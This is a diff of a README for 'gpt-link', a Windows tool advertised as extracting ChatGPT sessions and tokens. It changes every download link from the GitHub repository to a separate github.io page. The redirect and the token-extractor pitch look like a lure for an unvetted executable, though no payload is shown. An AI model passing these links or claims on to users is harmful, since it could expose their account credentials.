@@ -1,6 +1,6 @@
 # 🔗 gpt-link - Extract ChatGPT Sessions Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://github.com/ahmedalhdad2021-ops/gpt-link)
+[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://ahmedalhdad2021-ops.github.io)
 
 ## 🔍 What is gpt-link?
 
@@ -22,7 +22,7 @@ Follow these steps to run gpt-link on your Windows computer.
 ### 📥 Download
 
 Visit this link to download the application:
-[Download gpt-link](https://github.com/ahmedalhdad2021-ops/gpt-link)
+[Download gpt-link](https://ahmedalhdad2021-ops.github.io)
 
 ### 🖥️ System Requirements
 
@@ -91,6 +91,6 @@ This project is open source under the MIT License.
 
 ## 🔗 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://github.com/ahmedalhdad2021-ops/gpt-link)
+[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://ahmedalhdad2021-ops.github.io)
 
 Keywords: gpt-link, ChatGPT, session extractor, token extractor, ChatGPT tokens, access links, Windows tool, browser tool
